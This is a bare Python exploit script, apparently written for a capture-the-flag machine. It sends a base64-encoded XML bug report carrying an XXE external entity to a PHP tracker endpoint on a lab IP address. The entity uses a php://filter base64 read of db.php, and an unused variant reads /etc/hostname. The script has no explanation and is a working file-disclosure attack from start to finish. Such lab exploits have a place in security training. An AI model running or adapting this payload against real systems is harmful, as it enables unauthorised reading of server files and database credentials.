#/usr/bin/env python3
import requests
import base64
import urllib

# proxies = {
# 	"http": "http://127.0.0.1:8080",
# 	"https": "http://127.0.0.1:8080"
# }

url = "http://10.10.11.100/tracker_diRbPr00f314.php"

temp = "<!DOCTYPE title [<!ENTITY test SYSTEM 'file:///etc/hostname'>]>"

payload = b"""<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE title [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]>
		<bugreport>
		<title>&test;</title>
		<cwe>b</cwe>
		<cvss>c</cvss>
		<reward>d</reward>
		</bugreport>"""

payload = base64.b64encode(payload)

data = {"data": payload}

header = {
	"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
}

r = requests.post(url, data=data, headers=header)
print(r.text)